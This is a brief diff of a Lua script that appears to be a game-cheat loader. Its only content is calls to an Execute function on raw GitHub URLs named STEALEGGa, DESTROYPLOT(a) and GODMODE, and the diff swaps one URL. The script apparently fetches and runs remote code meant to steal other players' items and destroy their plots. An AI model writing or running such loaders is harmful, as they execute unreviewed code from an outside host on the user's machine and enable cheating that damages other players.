@@ -11,5 +11,5 @@ local function Execute(url)
 end
 
 Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/STEALEGGa")
-Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/DESTROYPLOT")
+Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/DESTROYPLOTa")
 Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/GODMODE")
